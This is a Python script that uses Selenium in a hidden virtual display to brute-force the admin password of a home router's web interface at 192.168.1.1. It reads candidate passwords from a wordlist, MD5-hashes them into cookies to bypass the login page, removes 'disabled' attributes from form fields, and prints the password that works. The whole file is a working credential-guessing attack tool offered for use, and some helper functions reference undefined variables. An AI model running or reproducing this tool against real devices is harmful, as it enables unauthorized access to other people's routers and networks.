#Please do not change the file rights
#Vvoox
import os
import sys
from datetime import date

from pip._vendor.distlib.compat import raw_input
from selenium import webdriver
from time import sleep
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from pyvirtualdisplay import Display
import hashlib

display = Display(visible=0, size=(800, 800))
display.start()
webdriver1 = webdriver.Chrome()


def start():
    url = "http://192.168.1.1/rpSys.html"
    # chrome_options = Options()
    # chrome_options.add_argument("user-data-dir=./User_Data2")
    # chrome_options.add_argument('--headless')
    # chrome_options.add_argument('--no-sandbox')
    # chrome_options.add_argument('--disable-dev-shm-usage')
    # display = Display(visible=0, size=(800, 800))
    # display.start()
    # webdriver1= webdriver.Chrome(options=chrome_options)
    # self.driver.minimize_window()
    # webdriver1= webdriver.Chrome(options=chrome_options)

    webdriver1.get(url)
    print("Open the url ...")
    login = "admin"
    tipsvalue = webdriver1.find_element_by_xpath("//input[contains(@name, 'tipsFlag')]")
    timevalue = webdriver1.find_element_by_xpath("//input[contains(@name, 'timevalue')]")

    loginMD5 = hashlib.md5(login.encode()).hexdigest()

    file = open('Passwords.txt', 'r')
    Lines = file.readlines()

    count = 0
    for line in Lines:
        password = line.strip()
        passwordMD5 = hashlib.md5(line.strip().encode()).hexdigest()
        print(add_cookies(loginMD5, passwordMD5))
        print("try "+str(count)+" with Login = " + str(login) + " and Password = " + str(password))
        count+=1
        if (webdriver1.current_url == "http://192.168.1.1/rpSys.html"):
            print("Worked :)")
            print("Your login = " + login)
            print("Your password = " + password)
            break
        else:
            print("Not working !\n")

    file.close()


def submit():
    webdriver1.execute_script("arguments[0].value = '1';", tipsvalue)
    webdriver1.execute_script("arguments[0].value = '1';", timevalue)

    webdriver1.find_element_by_xpath("//input[contains(@name, 'Login_Name')]") \
        .send_keys(login)
    sleep(1)
    webdriver1.find_element_by_xpath("//input[contains(@name, 'Login_Pwd')]") \
        .send_keys(password)
    sleep(1)
    webdriver1.find_element_by_xpath("//input[contains(@class, 'LoginBtn')]") \
        .submit()
    print("Done")
    print(timevalue.get_attribute('VALUE'))
    print(timevalue.get_attribute('VALUE'))


def fixing():
    TextField = webdriver1.find_element_by_xpath("//input[contains(@name, 'Login_Name')]")
    webdriver1.execute_script('arguments[0].removeAttribute("disabled");', TextField)

    TextField2 = webdriver1.find_element_by_xpath("//input[contains(@name, 'Login_Pwd')]")
    webdriver1.execute_script('arguments[0].removeAttribute("disabled");', TextField2)

    TextField3 = webdriver1.find_element_by_xpath("//input[contains(@name, 'LoginBtn')]")
    webdriver1.execute_script('arguments[0].removeAttribute("disabled");', TextField3)

    submit()


def add_cookies(loginMD5, passwordMD5):
    cookie1 = {'name': 'C0', 'value': loginMD5}
    cookie2 = {'name': 'C1', 'value': passwordMD5}

    webdriver1.add_cookie(cookie1)
    webdriver1.add_cookie(cookie2)

    webdriver1.refresh()
    webdriver1.get("http://192.168.1.1/rpSys.html")

    # print(webdriver1.get_cookies())
    return webdriver1.current_url

start()

